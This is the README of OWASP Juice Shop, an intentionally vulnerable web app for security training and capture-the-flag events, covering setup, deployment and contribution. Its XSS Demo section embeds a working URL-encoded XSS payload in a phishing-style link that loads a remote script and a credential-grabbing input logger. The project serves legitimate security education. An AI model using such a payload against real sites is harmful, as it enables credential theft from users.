# ![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/frontend/src/assets/public/images/JuiceShop_Logo_100px.png) OWASP Juice Shop [![OWASP Flagship](https://img.shields.io/badge/owasp-flagship%20project-48A646.svg)](https://www.owasp.org/index.php/OWASP_Project_Inventory#tab=Flagship_Projects) [![GitHub release](https://img.shields.io/github/release/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/releases/latest) [![Twitter Follow](https://img.shields.io/twitter/follow/owasp_juiceshop.svg?style=social&label=Follow)](https://twitter.com/owasp_juiceshop)

[![Build Status](https://travis-ci.org/bkimminich/juice-shop.svg?branch=master)](https://travis-ci.org/bkimminich/juice-shop)
[![Build status](https://ci.appveyor.com/api/projects/status/903c6mnns4t7p6fa/branch/master?svg=true)](https://ci.appveyor.com/project/bkimminich/juice-shop/branch/master)
[![Test Coverage](https://api.codeclimate.com/v1/badges/2a7af720d39b08a09904/test_coverage)](https://codeclimate.com/github/bkimminich/juice-shop/test_coverage)
[![Maintainability](https://api.codeclimate.com/v1/badges/2a7af720d39b08a09904/maintainability)](https://codeclimate.com/github/bkimminich/juice-shop/maintainability)
[![Greenkeeper badge](https://badges.greenkeeper.io/bkimminich/juice-shop-ctf.svg)](https://greenkeeper.io/)
[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/223/badge)](https://bestpractices.coreinfrastructure.org/projects/223)
![GitHub stars](https://img.shields.io/github/stars/bkimminich/juice-shop.svg?label=GitHub%20%E2%98%85&style=flat)

> [The most trustworthy online shop out there.](https://twitter.com/dschadow/status/706781693504589824)
> ([@dschadow](https://github.com/dschadow)) —
> [The best juice shop on the whole internet!](https://twitter.com/shehackspurple/status/907335357775085568)
> ([@shehackspurple](https://twitter.com/shehackspurple)) —
> [Actually the most bug-free vulnerable application in existence!](https://youtu.be/TXAztSpYpvE?t=26m35s)
> ([@vanderaj](https://twitter.com/vanderaj)) —
> [First you 😂😂then you 😢](https://twitter.com/kramse/status/1073168529405472768)
> ([@kramse](https://twitter.com/kramse))

OWASP Juice Shop is probably the most modern and sophisticated insecure
web application! It can be used in security trainings, awareness demos,
CTFs and as a guinea pig for security tools! Juice Shop encompasses
vulnerabilities from the entire
[OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along
with many other security flaws found in real-world applications!

![Juice Shop Screenshot Slideshow](screenshots/slideshow.gif)

For a detailed introduction, full list of features and architecture
overview please visit the official project page:
<http://owasp-juice.shop>

## Setup

### Deploy on Heroku (free ($0/month) dyno)

1. [Sign up to Heroku](https://signup.heroku.com/) and
   [log in to your account](https://id.heroku.com/login)
2. Click the button below and follow the instructions

[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)

> This is the quickest way to get a running instance of Juice Shop! If
> you have forked this repository, the deploy button will automatically
> pick up your fork for deployment! As long as you do not perform any
> DDoS attacks you are free to use any tools or scripts to hack your
> Juice Shop instance on Heroku!

### From Sources

1. Install [node.js](#nodejs-version-compatibility)
2. Run `git clone https://github.com/bkimminich/juice-shop.git` (or
   clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
   of the repository)
3. Go into the cloned folder with `cd juice-shop`
4. Run `npm install` (only has to be done before first start or when you
   change the source code)
5. Run `npm start`
6. Browse to <http://localhost:3000>

### Packaged Distributions [![GitHub release](https://img.shields.io/github/downloads/bkimminich/juice-shop/total.svg)](https://github.com/bkimminich/juice-shop/releases/latest) [![SourceForge](https://img.shields.io/sourceforge/dt/juice-shop.svg)](https://sourceforge.net/projects/juice-shop/)

1. Install a 64bit [node.js](#nodejs-version-compatibility) on your
   Windows (or Linux) machine
2. Download `juice-shop-<version>_<node-version>_<os>_x64.zip` (or
   `.tgz`) attached to
   [latest release](https://github.com/bkimminich/juice-shop/releases/latest)
3. Unpack and `cd` into the unpacked folder
4. Run `npm start`
5. Browse to <http://localhost:3000>

> Each packaged distribution includes some binaries for SQLite bound to
> the OS and node.js version which `npm install` was executed on.

### Docker Container [![Docker Automated build](https://img.shields.io/docker/automated/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/bkimminich/juice-shop/) [![Docker Pulls](https://img.shields.io/docker/pulls/bkimminich/juice-shop.svg)](https://registry.hub.docker.com/u/bkimminich/juice-shop/) ![Docker Stars](https://img.shields.io/docker/stars/bkimminich/juice-shop.svg) [![](https://images.microbadger.com/badges/image/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own image badge on microbadger.com") [![](https://images.microbadger.com/badges/version/bkimminich/juice-shop.svg)](https://microbadger.com/images/bkimminich/juice-shop "Get your own version badge on microbadger.com")

1. Install [Docker](https://www.docker.com)
2. Run `docker pull bkimminich/juice-shop`
3. Run `docker run --rm -p 3000:3000 bkimminich/juice-shop`
4. Browse to <http://localhost:3000> (on macOS and Windows browse to
   <http://192.168.99.100:3000> if you are using docker-machine instead
   of the native docker installation)

> If you want to run Juice Shop on a Raspberry Pi 3, there is an
> unofficial Docker image available at
> <https://hub.docker.com/r/arclight/juice-shop_arm> which is based on
> `resin/rpi-raspbian` and maintained by
> [@battletux](https://github.com/battletux).

#### Even easier: Run Docker Container from Docker Toolbox (Kitematic)

1. Install and launch
   [Docker Toolbox](https://www.docker.com/docker-toolbox)
2. Search for `juice-shop` and click _Create_ to download image and run
   container
3. Click on the _Open_ icon next to _Web Preview_ to browse to OWASP
   Juice Shop

### Vagrant

1. Install [Vagrant](https://www.vagrantup.com/downloads.html) and
   [Virtualbox](https://www.virtualbox.org/wiki/Downloads)
2. Run `git clone https://github.com/bkimminich/juice-shop.git` (or
   clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
   of the repository)
3. Run `cd vagrant && vagrant up`
4. Browse to [192.168.33.10:3000](http://192.168.33.10:3000)

> There is a very convenient Vagrant box available at
> <https://app.vagrantup.com/commjoen/boxes/trainingbox> (:microscope:)
> from [@commjoen](https://github.com/commjoen) which comes with latest
> Docker containers of the OWASP Juice Shop,
> [OWASP WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)
> and other vulnerable web applications as well as pentesting tools like
> [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project).

### Amazon EC2 Instance

1. In the _EC2_ sidenav select _Instances_ and click _Launch Instance_
2. In _Step 1: Choose an Amazon Machine Image (AMI)_ choose an _Amazon
   Linux AMI_ or _Amazon Linux 2 AMI_
3. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
   copy the script below into _User Data_
4. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
   for HTTP
5. Launch your instance
6. Browse to your instance's public DNS

```
#!/bin/bash
yum update -y
yum install -y docker
service docker start
docker pull bkimminich/juice-shop
docker run -d -p 80:3000 bkimminich/juice-shop
```

#### Don't repeat yourself: Define an EC2 Launch Template

1. In the _EC2_ sidenav select _Launch Templates_ and click _Create
   launch template_
2. Under _Launch template contents_ select as _AMI ID_ either _Amazon
   Linux AMI_ or _Amazon Linux 2 AMI_ (by using _Search for AMI_)
3. In the same section add a _Security Group_ that opens port 80 for
   HTTP
4. Unfold _Advanced details_ at the bottom of the screen and paste in
   the script above into _User Data_
5. Create your launch template
6. Launch one or multiple EC2 instances from your template
7. Browse to your instance's public DNS

> Technically Amazon could view hacking activity on any EC2 instance as
> an attack on their AWS infrastructure! We highly discourage aggressive
> scanning or automated brute force attacks! You have been warned!

### Azure Container Instance

1. Open and login (via `az login`) to your
   [Azure CLI](https://azure.github.io/projects/clis/) **or** login to
   the [Azure Portal](https://portal.azure.com), open the _CloudShell_
   and then choose _Bash_ (not PowerShell).
2. Create a resource group by running `az group create --name <group
   name> --location <location name, e.g. "centralus">`
3. Create a new container by running `az container create
   --resource-group <group name> --name <container name> --image
   bkimminich/juice-shop --dns-name-label <dns name label> --ports 3000
   --ip-address public`
4. Your container will be available at `http://<dns name
   label>.<location name>.azurecontainer.io:3000`

> For more information please refer to the
> [detailed walkthrough with screenshots](http://jasonhaley.com/post/Setup-OWASP-Juice-Shop-in-Azure-Container-Instances-%28Part-3-of-3%29)
> by [@JasonHaley](https://github.com/JasonHaley). You can alternatively
> follow his guide to
> [set up OWASP Juice Shop as an Azure Web App for Containers](http://jasonhaley.com/post/Setup-OWASP-Juice-Shop-in-Web-App-for-Containers-%28Part-2-of-3%29).

## Node.js version compatibility

OWASP Juice Shop officially supports the following versions of
[node.js](http://nodejs.org) in line as close as possible with the
official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
images and packaged distributions are offered accordingly:

| node.js  | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
|:---------|:------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
| 11.x     |                                                                                     | `juice-shop-<version>_node11_windows_x64.zip`, `juice-shop-<version>_node11_linux_x64.tgz` |
| __10.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node10_windows_x64.zip`, `juice-shop-<version>_node10_linux_x64.tgz` |
| 9.x      |                                                                                     | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
| 8.x      |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |

## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)

Feel free to have a look at the latest version of OWASP Juice Shop:
<http://demo.owasp-juice.shop>

> This is a deployment-test and sneak-peek instance only! You are __not
> supposed__ to use this instance for your own hacking endeavours! No
> guaranteed uptime! Guaranteed stern looks if you break it!

## Customization

Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
customized in its content and look & feel.

For detailed instructions and examples please refer to
[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).

## CTF-Extension

If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
recommend you set it up along with a [CTFd](https://ctfd.io) server
conveniently using the official
[`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
tool.

For step-by-step instructions and examples please refer to
[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
of our companion guide ebook.

## XSS Demo

To show the possible impact of
[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
can download this
[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
and run `docker-compose up` to start the juice-shop and the
shake-logger. Assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab
credentials! This could easily run on a 3rd party server in real life!

> We recommend to use Mozilla Firefox for this demo! You can also find a
> recording of this attack in action on YouTube:
> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)


## Additional Documentation

### Pwning OWASP Juice Shop [![](https://img.shields.io/leanpub/book/pages/juice-shop.svg)](https://leanpub.com/juice-shop) [![](https://img.shields.io/leanpub/book/sold/juice-shop.svg)](https://leanpub.com/juice-shop) [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)

This is the official companion guide to the OWASP Juice Shop. It will
give you a complete overview of the vulnerabilities found in the
application including hints how to spot and exploit them. In the
appendix you will even find complete step-by-step solutions to every
challenge. [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) is
published with
[GitBook](https://www.gitbook.com/book/bkimminich/pwning-owasp-juice-shop)
under
[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)
and is available **for free** in PDF, Kindle and ePub format. You can
also
[browse the full content online](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content)!

[![Pwning OWASP Juice Shop Cover](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/cover_small.jpg)](https://leanpub.com/juice-shop)

### Slide Decks

* [Introduction Slide Deck](http://bkimminich.github.io/juice-shop) in
  HTML5
* [PDF of the Intro Slide Deck](http://de.slideshare.net/BjrnKimminich/juice-shop-an-intentionally-insecure-javascript-web-application)
  on Slideshare

## Troubleshooting [![Gitter](http://img.shields.io/badge/gitter-join%20chat-1dce73.svg)](https://gitter.im/bkimminich/juice-shop)

If you need help with the application setup please check the
[TROUBLESHOOTING.md](TROUBLESHOOTING.md) or post your specific problem
or question in the
[official Gitter Chat](https://gitter.im/bkimminich/juice-shop).

## Contributing [![GitHub contributors](https://img.shields.io/github/contributors/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/graphs/contributors) [![Waffle.io - Columns and their card count](https://badge.waffle.io/bkimminich/juice-shop.svg?columns=all)](https://waffle.io/bkimminich/juice-shop) [![JavaScript Style Guide](https://img.shields.io/badge/code%20style-standard-brightgreen.svg)](http://standardjs.com/) [![Crowdin](https://d322cqt584bo4o.cloudfront.net/owasp-juice-shop/localized.svg)](https://crowdin.com/project/owasp-juice-shop) [![Bountysource Activity](https://img.shields.io/bountysource/team/juice-shop/activity.svg)](https://www.bountysource.com/teams/juice-shop)

We are always happy to get new contributors on board! Please check the
following table for possible ways to do so:

| :question:                                                                                            | :bulb:                                                                                                                                                                                                                                                                                   |
|:------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Found a bug? Crashed the app? Broken challenge? Found a vulnerability that is not on the Score Board? | [Create an issue](https://github.com/bkimminich/juice-shop/issues) or [post your ideas in the chat](https://gitter.im/bkimminich/juice-shop)                                                                                                                                             |
| Want to help with development? Pull requests are highly welcome!                                      | Please refer to the [_Contribute to development_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html) and [_Codebase 101_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/codebase.html) chapters of our companion guide ebook |
| Want to help with internationalization?                                                               | Find out how to join our [Crowdin project](https://crowdin.com/project/owasp-juice-shop) in [the _Helping with translations_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/translation.html)                                                       |
| Anything else you would like to contribute?                                                           | Write an email to owasp_juice_shop_project@lists.owasp.org or bjoern.kimminich@owasp.org                                                                                                                                                                                                 |

## References

Did you write a blog post, magazine article or do a podcast about or
mentioning OWASP Juice Shop? Or maybe you held or joined a conference
talk or meetup session, a hacking workshop or public training where this
project was mentioned?

Add it to our ever-growing list of [REFERENCES.md](REFERENCES.md) by
forking and opening a Pull Request!

## Merchandise

* On [Spreadshirt.com](http://shop.spreadshirt.com/juiceshop) and
  [Spreadshirt.de](http://shop.spreadshirt.de/juiceshop) you can get
  some swag (Shirts, Hoodies, Mugs) with the official OWASP Juice Shop
  logo
* On
  [StickerYou.com](https://www.stickeryou.com/products/owasp-juice-shop/794)
  you can get variants of the OWASP Juice Shop logo as single stickers
  to decorate your laptop with. They can also print magnets, iron-ons,
  sticker sheets and temporary tattoos.

The most honorable way to get some stickers is to
[contribute to the project](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html)
by fixing an issue, finding a serious bug or submitting a good idea for
a new challenge!

We're also happy to supply you with stickers if you organize a meetup or
conference talk where you use or talk about or hack the OWASP Juice
Shop! Just
[contact the mailing list](mailto:owasp_juice_shop_project@lists.owasp.org)
or [the project leader](mailto:bjoern.kimminich@owasp.org) to discuss
your plans! !

## Donations

### PayPal [![PayPal](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=paypal%40owasp%2eorg&lc=BM&item_name=OWASP%20Juice%20Shop%20Project&item_number=OWASP%20Foundation&no_note=0&currency_code=USD&bn=PP%2dDonationsBF)

PayPal donations via above button go to the OWASP Foundations and are
earmarked for "Juice Shop". This is the preferred and most convenient
way to support the project.

### Credit Card (through RegOnline)

OWASP hosts a
[donation form on RegOnline](https://www.regonline.com/Register/Checkin.aspx?EventID=1044369).
Refer to the
[Credit card donation step-by-step](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/donations.html#credit-card-donation-step-by-step)
guide for help with filling out the donation form correctly.

### Liberapay [![Liberapay receiving](https://img.shields.io/liberapay/receives/bkimminich.svg)](https://liberapay.com/bkimminich/donate)

### Crypto Currency

[![Bitcoin](https://img.shields.io/badge/bitcoin-1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm-orange.svg)](https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm)
[![Dash](https://img.shields.io/badge/dash-Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW-blue.svg)](https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW)
[![Ether](https://img.shields.io/badge/ether-0x0f933ab9fcaaa782d0279c300d73750e1311eae6-lightgrey.svg)](https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6)

## Contributors

The OWASP Juice Shop core project team are:

- [Björn Kimminich](https://github.com/bkimminich) aka `bkimminich`
  ([Project Leader](https://www.owasp.org/index.php/Projects/Project_Leader_Responsibilities))
- [Jannik Hollenbach](https://github.com/J12934) aka `J12934`
- [Timo Pagel](https://github.com/wurstbrot) aka `wurstbrot`

For a list of all contributors to the OWASP Juice Shop please visit our
[HALL_OF_FAME.md](HALL_OF_FAME.md).

## Licensing [![license](https://img.shields.io/github/license/bkimminich/juice-shop.svg)](LICENSE)

This program is free software: you can redistribute it and/or modify it
under the terms of the [MIT license](LICENSE). OWASP Juice Shop and any
contributions are Copyright © by Bjoern Kimminich 2014-2019.

![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/frontend/src/assets/public/images/JuiceShop_Logo_400px.png)
